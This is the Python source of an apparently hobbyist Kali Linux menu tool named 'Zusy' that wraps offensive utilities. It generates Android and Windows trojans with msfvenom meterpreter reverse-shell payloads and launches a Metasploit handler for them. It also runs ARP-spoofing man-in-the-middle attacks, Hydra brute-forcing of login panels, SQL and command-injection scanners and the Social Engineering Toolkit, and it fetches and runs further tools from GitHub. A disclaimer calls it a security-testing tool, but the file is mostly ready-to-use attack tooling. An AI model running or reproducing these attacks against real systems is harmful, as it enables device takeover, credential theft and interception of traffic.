from subprocess import run, PIPE
import os
import signal
from colorama import Fore
import subprocess
import threading
import time

def signal_handler(sig, frame):
    print("")
    print("")
    print("Thanks for using!!!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)


def clear_screen():
    os.system('clear')

def get_kali_ip():
    process = run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=PIPE, text=True)
    if process.returncode == 0:
        return process.stdout.strip()
    else:
        return None

def create_trojan():
    time.sleep(0.5)
    print(Fore.RED + "[Message] " + Fore.WHITE +"Wait Please...")
    time.sleep(0.5)
    clear_screen()
    print("[0] Back\n")
    print("[1] Android")
    print("[2] Windows")
    
    platform_choice = input("Which operating system do you want to create for? (1/2): ")
    
    if platform_choice == "0":
        main_menu()
    
    platform = ""
    file_extension = ""
    
    if platform_choice == "1":
        platform = "android"
        file_extension = "apk"
    elif platform_choice == "2":
        platform = "windows"
        file_extension = "exe"
    else:
        print("Invalid choice.")
        create_trojan()
    
    clear_screen()
    lhost = input("LHOST = ")
    if not lhost:
        lhost = get_kali_ip()
        if not lhost:
            print("Failed to get Kali Linux IP address.")
            input("\nPress Enter to back...")
            main_menu()
    
    lport = input("LPORT = ")
    
    filedirectory = input("Please enter the file name: ")
    clear_screen()
    
    trojan_command = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
    
    print("Please wait...")
                    
    process = run(trojan_command, shell=True)
    if process.returncode == 0:
        print(Fore.RED + "[Message] " + Fore.WHITE +f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
        print(Fore.BLUE + "[Status] " + Fore.WHITE +"Starting Metasploit...")
        msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
        run(f"msfconsole -q -x '{msf_command}'", shell=True)
    else:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Trojan creation failed.")
        
    input("\nPress Enter to continue...")
    main_menu()


def ip_tracer():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Enter IP Address: ")
    if target_ip == "0":
        main_menu()
    
    if not target_ip:
        print("\033[91mError: Please enter a valid IP address\033[0m")
        input("\nPress Enter to go back...")
        main_menu()
        return
    
    ip_tracer_command = f"curl ipinfo.io/{target_ip}"
    print(Fore.RED + "[Message] " + Fore.WHITE +f"Please wait...")
    process = run(ip_tracer_command, shell=True, capture_output=True, text=True)
    if process.stdout is not None:
        print(process.stdout)
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()

def nmap_scan():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Nmap running...")
    time.sleep(0.5)
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target IP: ")
    if target_ip == "0":
        main_menu()
        return
    nmap_command = f"nmap -p1-65535 -sV -sS -T4 -A -O {target_ip}"
    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Nmap scan completed.")
    input("\nPress Enter to go back...")
    main_menu()

def port_scan():
    clear_screen()
    port_scancommand = "python3 portscan.py"
    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
    process = run(port_scancommand, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")    
        print(Fore.RED + "[Message] " + Fore.WHITE +"Port scan completed.")
    input("\nPress Enter to go back...")
    main_menu() 

def netdiscover():
    clear_screen()
    netdiscover_command = "netdiscover"
    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
    process = run(netdiscover_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()
    
    

def sql_scan():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"SQLMap running...")
    time.sleep(0.5)
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"sqlmap -u {target_ip}"
    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()

def commix_scan():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Commix running...")
    time.sleep(0.5)
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"commix -u {target_ip}"
    print(Fore.RED + "[Message] " + Fore.WHITE +"Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()
    
def info():
    clear_screen()
    print("Credits : No_Name.exe (Zusy)")
    print("")
    print("This tool is made for security testing and cybersecurity! We are not responsible for malicious use!")
    print("")
    print("by Offensive Secuirty and No_Name.exe")
    print("")
    print("Github : " + Fore.BLUE + "https://github.com/NoNameZusy/" + Fore.WHITE)
    print("")
    print("Youtube : " + Fore.BLUE + "https://www.youtube.com/channel/UCql2YVKt-wF1LFuxhAthcaQ" + Fore.WHITE)
    print("")
    print("")
    input("Press Enter to go back...")
    main_menu()

def open_metasploit():
    clear_screen()
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Metasploit running...\n")
    run("msfconsole -q", shell=True)

def cupp_open():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Cupp running...")
    time.sleep(0.5)
    clear_screen()
    process = run("which cupp", shell=True, capture_output=True, text=True)
    if process.returncode == 0:
        print("")
        run("cupp -i", shell=True)
    else:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Cupp is not installed. Installing...")
        install_command = "sudo apt install cupp"
        process = run(install_command, shell=True)
        if process.returncode == 0:
            print(Fore.RED + "[Message] " + Fore.WHITE +"Cupp installed successfully. Opening...")
            run("cupp -i", shell=True)
        else:
            print(Fore.RED + "[Message] " + Fore.WHITE +"Failed to install Cupp.")
    input("\nPress Enter to go back...")
    main_menu()

def update_kali():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Upgrading System...")
    time.sleep(0.5)
    clear_screen()
    run("sudo apt update && sudo apt upgrade -y", shell=True)

def ifconfig():
    clear_screen()
    run("ifconfig", shell=True)
    input("\nPress Enter to go back...")
    main_menu()

def kali_undercover():
    clear_screen()
    run("kali-undercover && python3 OpenZusy.py", shell=True)

def update_tool():
    try:
        print(Fore.BLUE + "[Status] " + Fore.WHITE +"Updating tool...")
        run("cd .. && rm -rf Zusy && git clone https://github.com/NoNameZusy/Zusy.git && cd Zusy && python3 OpenZusy.py", shell=True)
    except Exception as e:
        print(Fore.RED + "[Message] " + Fore.WHITE +"Error updating tool:", e)
        main_menu()
        
def MITM():
    clear_screen()
    wifi_ip = input("Your Wifi IP > ")
    target_ip = input("Target IP > ")

    if wifi_ip == "0":
        main_menu()
    else:
        process1 = subprocess.Popen(f"arpspoof -i eth0 -t {wifi_ip} {target_ip}", shell=True)
        process2 = subprocess.Popen(f"arpspoof -i eth0 -t {target_ip} {wifi_ip}", shell=True)

        print(Fore.RED + "[Message] " + Fore.WHITE +"\nPress ctrl + z to stop the attack.\n")
        while True:
            stop_command = input().strip().lower()
            if stop_command == 'd':
                os.kill(process1.pid, signal.SIGTERM)
                os.kill(process2.pid, signal.SIGTERM)
                print(Fore.RED + "[Message] " + Fore.WHITE +"Processes terminated.")
                break

def reboot_system():
    clear_screen()
    input("Press Enter to continue...")
    run("reboot", shell=True)

def threat_manager():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"ThreatManager running...")
    time.sleep(0.5)
    if os.path.isdir("ThreatManager"):
        run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNatmmeZusy/ThreatManager.git", shell=True)
        run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
        
def ZusyFramework():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"ZusyFramework running...")
    time.sleep(0.5)
    clear_screen()
    if os.path.isdir("ZusyFramework"):
        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/ZusyFramework.git", shell=True)
        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)
        
def KaliToolInstaller():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"KaliToolInstaller running...")
    time.sleep(0.5)
    clear_screen()
    if os.path.isdir("KaliToolInstaller"):
        run("cd .. && cd KaliToolInstaller && python3 chech.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/KaliToolInstaller.git", shell=True)
        run("cd .. && cd KaliToolInstaller && python3 check.py", shell=True)              
        
def iplogger():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"IP-Logger running...")
    time.sleep(0.5)
    clear_screen()
    if os.path.isdir("IP-Logger"):
        run("cd .. && cd IP-Logger && bash iplogger.sh", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/IP-Logger.git", shell=True)
        run("cd .. && cd IP-Logger && bash iplogger.sh", shell=True)   
             
        
def No_Escape():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"No_Escape running...")
    time.sleep(0.5)
    if os.path.isdir("No_Escape"):
        run("cd .. && cd No_Escape && python3 No_Escape.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/No_Escape.git", shell=True)
        run("cd .. && cd No_Escape && python3 No_Escape.py", shell=True)        
        
def wifi_scan():
    clear_screen()
    port_scancommand = "python3 find.py"
    process = run(port_scancommand, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")    
        print(Fore.RED + "[Message] " + Fore.WHITE +"Wifi scan completed.")
    input("\nPress Enter to go back...")
    main_menu() 
        

def social_engineering():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Social Engineering Toolkit running...")
    time.sleep(0.5)
    clear_screen()
    run("setoolkit", shell=True)
    
def hydra():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Hydra running...")
    time.sleep(0.5)
    os.system('clear')
    user_admin_name = input("Username: ")
    user_password = input("Password: ")
    website_url = input("Panel URL: ")
    website_file = input("File Extension (ex. /login/admin.php/): ")

    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE + "Starting attack...")
    time.sleep(1)
    run(f"hydra -l {user_admin_name} -P /root/Desktop/wordlist.txt {website_url} http-post-form '{website_file}:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -I", shell=True)

def bettercap():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Bettercap running...")
    time.sleep(0.5)
    run("bettercap", shell=True)

def wireshark():
    time.sleep(0.5)
    print(Fore.BLUE + "[Status] " + Fore.WHITE +"Wireshark running...")
    run("wireshark", shell=True)


def InformationManager():
    if os.path.isdir("InformationManager"):
        run("cd .. && cd InformationManager && python3 Information.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/InformationManager.git", shell=True)
        run("cd .. && cd InformationManager && python3 Information.py", shell=True)

def main_menu():
    clear_screen()
    logo = """
      ╔════╦╗─╔╦═══╦╗──╔╗
      ╚══╗═║║─║║╔═╗║╚╗╔╝║
      ──╔╝╔╣║─║║╚══╬╗╚╝╔╝
      ─╔╝╔╝║║─║╠══╗║╚╗╔╝─
      ╔╝═╚═╣╚═╝║╚═╝║─║║──
      ╚════╩═══╩═══╝─╚╝──
-------{ By No_Name.exe }-------
                        v 2.0
    """
    print(logo)
    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[21] Hydra\n[22] Bettercap\n[23] Wireshark\n[24] IP-Logger\n[25] KaliToolInstaller [CHECK]\n[99] Exit\n"
    "\n[100] Update\n[101] Info\n")
    choice = input("Zusy ~$ ")
    if choice == "1":
        nmap_scan()
    elif choice == "2":
        open_metasploit()
    elif choice == "3":
        social_engineering()
    elif choice == "4":
        sql_scan()
    elif choice == "5":
        commix_scan()    
    elif choice == "6":
        reboot_system()
    elif choice == "7":
        kali_undercover()  
    elif choice == "8":
        update_kali()   
    elif choice == "9":
        cupp_open() 
    elif choice == "10":
        ifconfig()      
    elif choice == "11":
        create_trojan()   
    elif choice == "12":
        ip_tracer() 
    elif choice == "13":
        netdiscover()   
    elif choice == "14":
        threat_manager()    
    elif choice == "15":
        port_scan() 
    elif choice == "16":
        InformationManager()
    elif choice == "17":
        wifi_scan()
    elif choice == "18":
        No_Escape()
    elif choice == "19":
        MITM()    
    elif choice == "20":
    	ZusyFramework()
    elif choice == "21":
        hydra() 
    elif choice == "22":
        bettercap()
    elif choice == "23":
        wireshark()   
    elif choice == "24":
        iplogger()
    elif choice == "25":
        KaliToolInstaller()                            
    elif choice == "100":
        update_tool()
    elif choice == "101":
        info()    
    elif choice == "99":
        print("\nThanks for using!!!")
    else:
        print("\nError: Please Try Again")
        main_menu()

if __name__ == "__main__":
    main_menu()
